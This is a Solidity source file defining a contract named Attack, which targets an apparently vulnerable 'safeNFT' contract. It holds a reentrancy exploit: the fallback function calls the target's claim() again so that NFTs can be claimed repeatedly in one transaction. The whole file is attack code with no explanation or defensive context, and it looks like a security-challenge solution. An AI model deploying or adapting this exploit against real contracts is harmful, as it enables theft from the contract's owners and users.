// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IsafeNFT {
    function canClaim(address) external view returns (bool);

    function buyNFT() external payable;

    function claim() external;
}

contract Attack {
    IsafeNFT safeNftContract;

    constructor(address _safeNftAddress) {
        safeNftContract = IsafeNFT(_safeNftAddress);
    }

    function buyNFT() public payable {
        safeNftContract.buyNFT();
    }

    function claimAttack() public {
        safeNftContract.claim();
    }

    fallback() external {
        safeNftContract.claim();
    }

    receive() external payable {}
}